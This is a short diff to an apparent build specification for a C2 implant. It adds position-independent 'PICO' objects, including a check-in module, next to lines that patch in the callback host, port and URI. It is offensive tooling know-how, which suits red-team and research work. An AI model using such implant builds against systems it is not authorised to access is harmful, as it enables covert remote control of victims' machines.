@@ -9,6 +9,9 @@ x64:
 	
 	load "bin/params.o"
 	merge
+
+	load "bin/pico.o"
+	merge
 	
 	load "bin/util.o"
 	merge
@@ -31,6 +34,12 @@ x64:
 	# Patch in string parameters from the C2.
 	pack $RAW_PARAMS "zziiz" %PAYLOAD_UUID %CALLBACK_HOST %CALLBACK_PORT %CALLBACK_HTTPS %CALLBACK_URI
 	patch "RAW_PARAMS" $RAW_PARAMS
+	
+	# Load built-in PICOs.
+	load "bin/pico_checkin.o"
+		make object
+		export
+		link "pico_checkin"
 
  	# Export the resulting PIC.
 	export
